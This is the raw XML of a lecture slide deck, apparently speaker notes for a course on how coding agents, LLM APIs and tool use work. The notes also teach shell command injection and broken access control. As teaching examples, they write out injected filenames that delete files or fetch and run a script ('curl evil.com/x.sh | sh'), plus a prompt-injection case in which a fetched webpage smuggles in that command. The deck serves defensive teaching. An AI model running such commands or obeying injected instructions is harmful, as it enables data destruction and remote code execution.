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embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Courier Prime" pitchFamily="49" charset="77"/>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Md20Mu25bWg6BqdlbkE6HNvbm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font" Target="fonts/font1.fntdata"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font2.fntdata"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font3.fntdata"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font4.fntdata"/><Relationship Id="rId66" Type="http://customschemas.google.com/relationships/presentationmetadata" Target="meta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Last technical lecture of the semester. The thesis deliberately echoes the 8.1 swap: the magic isn't magic, it's a loop you can write in about 30 lines. By the end of class students should be able to open a Claude Code transcript and tell you exactly what the loop is doing on each turn, which is honestly a useful skill for the last two weeks of project work.</a:t>
            </a:r>
            <a:endParaRPr dirty="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ec891ba402_1_24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g3ec891ba402_1_2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It's just a filename going into a command. What's the worst</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># an attacker can put in that filename?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Give them a minute. The filename is concatenated straight into a string handed to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.system</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, which runs it through the shell. The shell interprets semicolons, pipes, backticks, dollar-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>parens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - all of it. An attacker uploads a file (or just sends a filename) of `</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cat.png</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>; rm -rf /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/* #` and the shell happily runs the convert command AND the rm. Or `</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cat.png</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>; curl </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>x.sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> #` to download and execute a payload - that's full remote code execution on your server. The mistake is identical to SQL injection: untrusted text became part of a structured thing (a shell command) the system parses. Don't reveal the fix yet - next two slides give one more example, then the rule.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Google Shape;92;g3ec891ba402_1_24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c891ba402_1_3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g3ec891ba402_1_3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The membership check passes only for orgs you belong to.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># So this is locked down, right?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This is the subtle one and it's a real, common, dangerous bug - cross-tenant data leak. The authorization check is present AND correct: it verifies you're a member of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>org_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. The bug is that it authorizes the CONTAINER (the org) but the action touches the ITEM (the invoice), and nothing ties the invoice back to the org. So a member of org 5 (which they legitimately belong to) requests /orgs/5/invoices/9999 where invoice 9999 belongs to org 200. Membership check passes - they really are in org 5. Invoice fetch ignores the org entirely. They just read another company's invoice. This is how multi-tenant SaaS apps leak across customers, and it's a favorite of bug-bounty hunters. The lesson: authorize the thing you're actually touching, not its parent.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Google Shape;101;g3ec891ba402_1_3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ec891ba402_1_33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g3ec891ba402_1_3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Now an invoice that isn't in your org reads as 404, even</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># though you passed the membership check. The authorization</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># follows the data, not the URL structure. The rule:</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># authorize the object you touch, not its parent.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Drive home that the fix is to make the ownership relationship explicit in the query that fetches the item: AND </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>org_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = :org. The membership check and the item fetch have to agree on the same scope. A useful framing: any time a URL has nested ids (/parent/{a}/child/{b}), ask whether the code actually verifies child b belongs to parent a. Most of the time, when this bug exists, it doesn't. This is OWASP's #1 category (Broken Access Control) and the single most-reported bug class in bug bounties.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Google Shape;110;g3ec891ba402_1_33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Cold open. The students have been shipping code with agents since week one. Today is the lecture where the thing inside that agent stops being a black box.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="Google Shape;119;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ec891ba402_1_2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g3ec891ba402_1_2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Land the thesis. The loop really is about ten lines, there's nothing else hiding in there. The 'model has no memory' bit is the part that surprises people coming to agents fresh - every call is stateless from the model's side, and the illusion of a continuing conversation is just you appending to a list every turn. Once that clicks the rest of this is easy.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Google Shape;125;g3ec891ba402_1_2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c891ba402_1_2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g3ec891ba402_1_2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Land the thesis. The loop really is about ten lines, there's nothing else hiding in there. The 'model has no memory' bit is the part that surprises people coming to agents fresh - every call is stateless from the model's side, and the illusion of a continuing conversation is just you appending to a list every turn. Once that clicks the rest of this is easy.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Google Shape;132;g3ec891ba402_1_2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Land the thesis. The loop really is about ten lines, there's nothing else hiding in there. The 'model has no memory' bit is the part that surprises people coming to agents fresh - every call is stateless from the model's side, and the illusion of a continuing conversation is just you appending to a list every turn. Once that clicks the rest of this is easy.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Google Shape;139;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Build up from the smallest possible thing - one API call with one message - and grow it into the loop. By the end of this section the loop is fully assembled and the only thing still missing is tools.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Google Shape;146;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c891ba402_1_4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g3ec891ba402_1_4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Big callback to 3.1 / 5.2 here. Students have made plenty of HTTP requests by now, so the LLM API isn't some separate category of thing, it's just one more JSON endpoint. What's different is only what runs server-side - not your code, not a database query, but a model that produces text. From the client's side it's completely indistinguishable from any other API. Worth hammering, because the easy mistake is to treat the agent as a magical category instead of 'an HTTP client calling one particular endpoint over and over.'</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Google Shape;152;g3ec891ba402_1_4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Big callback to 3.1 / 5.2 here. Students have made plenty of HTTP requests by now, so the LLM API isn't some separate category of thing, it's just one more JSON endpoint. What's different is only what runs server-side - not your code, not a database query, but a model that produces text. From the client's side it's completely indistinguishable from any other API. Worth hammering, because the easy mistake is to treat the agent as a magical category instead of 'an HTTP client calling one particular endpoint over and over.'</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Google Shape;159;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it line by line. The Anthropic client is just a thin wrapper around an HTTP POST - if you </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tcpdump'd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> this you'd see exactly the JSON body from the previous slide. `messages` is the list, `content` is the text, `model` picks which version of Claude, `</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>max_tokens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>` caps the response length so a runaway answer doesn't burn your wallet. The response object has `.content`, which is a list of content blocks - for a plain text response there's just the one block with `.text`. Show the actual output. Twelve lines, that's a working LLM client.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166" name="Google Shape;166;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ec891ba402_1_2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g3ec891ba402_1_2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of the more counterintuitive pieces of the whole lecture, worth pausing on. The chat interfaces people have used - ChatGPT, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Claude.ai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - all FEEL like the model remembers, but that's only because the UI is carrying the messages list for you and re-sending the whole thing every turn. The model itself is stateless. Which is actually good news - it means you have total control over what the model 'remembers,' just by controlling what goes into the list. We'll lean on exactly that when we get to tools.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;175;g3ec891ba402_1_2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c891ba402_1_2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 name="Google Shape;181;g3ec891ba402_1_2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of the more counterintuitive pieces of the whole lecture, worth pausing on. The chat interfaces people have used - ChatGPT, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Claude.ai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - all FEEL like the model remembers, but that's only because the UI is carrying the messages list for you and re-sending the whole thing every turn. The model itself is stateless. Which is actually good news - it means you have total control over what the model 'remembers,' just by controlling what goes into the list. We'll lean on exactly that when we get to tools.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Google Shape;182;g3ec891ba402_1_24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of the more counterintuitive pieces of the whole lecture, worth pausing on. The chat interfaces people have used - ChatGPT, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Claude.ai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - all FEEL like the model remembers, but that's only because the UI is carrying the messages list for you and re-sending the whole thing every turn. The model itself is stateless. Which is actually good news - it means you have total control over what the model 'remembers,' just by controlling what goes into the list. We'll lean on exactly that when we get to tools.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="189" name="Google Shape;18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c891ba402_0_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g3ec891ba402_0_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a working chatbot. About twelve lines, no framework, no library beyond the SDK. Append user, call, append assistant, print, loop. The only piece of state anywhere is the messages list, which is just a Python list of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dicts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. If you printed `messages` at the end of every turn you'd watch it grow by two entries each time around - the user's input and the model's reply. The server never sees state, ever. The client is the one holding it, and the client is you.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="196" name="Google Shape;196;g3ec891ba402_0_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c891ba402_0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g3ec891ba402_0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a working chatbot. About twelve lines, no framework, no library beyond the SDK. Append user, call, append assistant, print, loop. The only piece of state anywhere is the messages list, which is just a Python list of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dicts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. If you printed `messages` at the end of every turn you'd watch it grow by two entries each time around - the user's input and the model's reply. The server never sees state, ever. The client is the one holding it, and the client is you.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="205" name="Google Shape;205;g3ec891ba402_0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 name="Google Shape;21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a working chatbot. About twelve lines, no framework, no library beyond the SDK. Append user, call, append assistant, print, loop. The only piece of state anywhere is the messages list, which is just a Python list of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dicts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. If you printed `messages` at the end of every turn you'd watch it grow by two entries each time around - the user's input and the model's reply. The server never sees state, ever. The client is the one holding it, and the client is you.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Google Shape;214;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answer is (c). The API is fully stateless: every call ships the entire message history, the server reads it fresh, generates a reply, hands it back. No session ID, no server-side memory, no implicit context. Walk (a) and (b) out loud - they're the natural guesses given how chat UIs feel, and they're both wrong. (d) is the trap for anyone who overcorrects and assumes the API is too clever to re-send the whole history. It really does send the whole thing, every single time. The cost side of that is the next slide.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="223" name="Google Shape;223;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c891ba402_1_4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g3ec891ba402_1_4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cost is real and worth naming: long conversations get expensive because every turn re-bills you for every token that came before. That's part of why prompt caching exists - the API can cache the prefix of your messages list across calls, so re-sending a long history doesn't re-charge you for the full prefix every time. Don't go deep on caching here, just name it as the obvious lever and move on. The thing to leave them with is the upside: statelessness means your code is the source of truth for the conversation, which is what lets you edit, branch, persist at all. None of that would be possible if state lived on the server.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="232" name="Google Shape;232;g3ec891ba402_1_4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ec891ba402_1_4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g3ec891ba402_1_4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cost is real and worth naming: long conversations get expensive because every turn re-bills you for every token that came before. That's part of why prompt caching exists - the API can cache the prefix of your messages list across calls, so re-sending a long history doesn't re-charge you for the full prefix every time. Don't go deep on caching here, just name it as the obvious lever and move on. The thing to leave them with is the upside: statelessness means your code is the source of truth for the conversation, which is what lets you edit, branch, persist at all. None of that would be possible if state lived on the server.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="Google Shape;239;g3ec891ba402_1_4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cost is real and worth naming: long conversations get expensive because every turn re-bills you for every token that came before. That's part of why prompt caching exists - the API can cache the prefix of your messages list across calls, so re-sending a long history doesn't re-charge you for the full prefix every time. Don't go deep on caching here, just name it as the obvious lever and move on. The thing to leave them with is the upside: statelessness means your code is the source of truth for the conversation, which is what lets you edit, branch, persist at all. None of that would be possible if state lived on the server.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Google Shape;246;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c891ba402_1_1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g3ec891ba402_1_1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Don't reveal - get a couple of guesses out loud first. This is the model the room is carrying in their heads: they intuitively assume the model has direct access to their machine because that's how the UI feels. It does not, and cannot, because of the client-server split you taught in 3.1 - the model is on a different computer behind an HTTP endpoint, full stop. Someone will usually get close to 'the model asks and Cursor sends it.' Let them, then the next slide names it.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="253" name="Google Shape;253;g3ec891ba402_1_1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other half. The loop is the skeleton; tools are how the agent actually does anything in the real world. By the end of this section students should be able to explain exactly how Cursor reads a file from their disk.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="260" name="Google Shape;260;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right place to surface the model the room is carrying in their heads - they intuitively assume the model has direct access to their machine because that's how the UI feels. It does not, and cannot, because of the client-server architecture you taught in 3.1. The model is on a different computer behind an HTTP endpoint, full stop. The way it 'reads files' is by outputting a structured request, you (the agent code) executing the request locally, and feeding the result back into the next call. Once it's spelled out this way it tends to feel obvious in retrospect.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;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ec891ba402_0_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g3ec891ba402_0_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four steps are the most important diagram in the lecture, worth tracing through more than once. Step 1 is configuration: you describe the tools to the model via JSON schemas. Step 2 is the model's CHOICE - it either returns text (a normal response) or a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> block (a structured request). Step 3 is on YOU: the model literally can't execute anything, all it can do is output JSON saying what it wants. Step 4 closes the loop - the tool result becomes input to the next call. And really lean on step 3 being where all the security and reliability questions live, because your code is the thing doing the actual work, so your code is also where it can all go wrong.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="273" name="Google Shape;273;g3ec891ba402_0_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c891ba402_0_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g3ec891ba402_0_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four steps are the most important diagram in the lecture, worth tracing through more than once. Step 1 is configuration: you describe the tools to the model via JSON schemas. Step 2 is the model's CHOICE - it either returns text (a normal response) or a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> block (a structured request). Step 3 is on YOU: the model literally can't execute anything, all it can do is output JSON saying what it wants. Step 4 closes the loop - the tool result becomes input to the next call. And really lean on step 3 being where all the security and reliability questions live, because your code is the thing doing the actual work, so your code is also where it can all go wrong.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="280" name="Google Shape;280;g3ec891ba402_0_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ec891ba402_0_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g3ec891ba402_0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four steps are the most important diagram in the lecture, worth tracing through more than once. Step 1 is configuration: you describe the tools to the model via JSON schemas. Step 2 is the model's CHOICE - it either returns text (a normal response) or a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> block (a structured request). Step 3 is on YOU: the model literally can't execute anything, all it can do is output JSON saying what it wants. Step 4 closes the loop - the tool result becomes input to the next call. And really lean on step 3 being where all the security and reliability questions live, because your code is the thing doing the actual work, so your code is also where it can all go wrong.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="287" name="Google Shape;287;g3ec891ba402_0_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four steps are the most important diagram in the lecture, worth tracing through more than once. Step 1 is configuration: you describe the tools to the model via JSON schemas. Step 2 is the model's CHOICE - it either returns text (a normal response) or a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> block (a structured request). Step 3 is on YOU: the model literally can't execute anything, all it can do is output JSON saying what it wants. Step 4 closes the loop - the tool result becomes input to the next call. And really lean on step 3 being where all the security and reliability questions live, because your code is the thing doing the actual work, so your code is also where it can all go wrong.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="294" name="Google Shape;294;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0" name="Google Shape;30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 tool definition is a name, a description, and a JSON schema for the arguments. The description is the part that matters most - it's the only thing the model has to go on when it's deciding WHEN to call this tool. Write it like a docstring for someone who's never seen the code. The schema is just standard JSON Schema; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>FastAPI's</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Pydantic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> spits out the same format, so anyone curious has already seen it in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>OpenAPI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> docs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>FastAPI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> generates. The model uses the schema to shape its </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> output, and it won't invent arguments that aren't in there.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Google Shape;301;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9" name="Google Shape;30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response shape changes once tools are available. Without tools you got back a single text block. With tools, the model can instead return a `</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>` block - a structured object naming which tool it wants and what arguments to pass. The id is what ties this request to the result in step 4; you'll quote it back when you hand the answer over. And the thing to stress: the model did NOT execute anything. It just output some JSON describing what it'd like to happen. The file is untouched, your disk is untouched, no side effects yet.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="310" name="Google Shape;310;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8" name="Google Shape;31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round-trip in code. The two </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>messages.append</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> calls are the key bit: the assistant's </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> request goes in as an assistant message, and the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> goes in under a user role (yes, really - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a user-role block in the Claude API convention, which throws people the first time). The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ties them together. After this, calling </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>messages.create</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> again hands the model a conversation where it can see its own request, your answer, and figure out what to tell the user. A lot of the time it'll just text-respond now ('the bug in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>app.py</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is on line 12...'), but it can also fire off another tool and keep going. The loop wraps the whole thing in `while </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.stop_reason</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> == '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>': ...`</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="319" name="Google Shape;319;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The answer is (b). The model can ask for any shell command at all, and this function will happily run it. Today's models are well-aligned and won't usually go asking for `rm -rf ~` out of nowhere, but two things still bite you: prompt injection (untrusted content in the messages list - say a webpage you had the agent fetch - can smuggle in instructions like 'now run curl </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'), AND plain old model mistakes, where it thinks some aggressive cleanup command is the right move. (a) is exactly the wrong mental model: tools are authorized access, not 'trust the model.' (c) and (d) are red herrings.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="328" name="Google Shape;328;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ec891ba402_0_4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g3ec891ba402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hammer: tools aren't 'how the model does things,' tools are 'what you've authorized to happen on the model's behalf.' That's a security framing, not a capability one. The Claude Code analogy is worth drawing out - it has tools like read, write, bash, but it ALSO has a permission system that asks the user before it runs the destructive ones. That permission prompt isn't friction, it's the design choice that makes a really powerful tool safe to hand to people. For the final project, anyone wiring an agent into their app should think hard about what tools they're exposing and what the worst case actually looks like.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
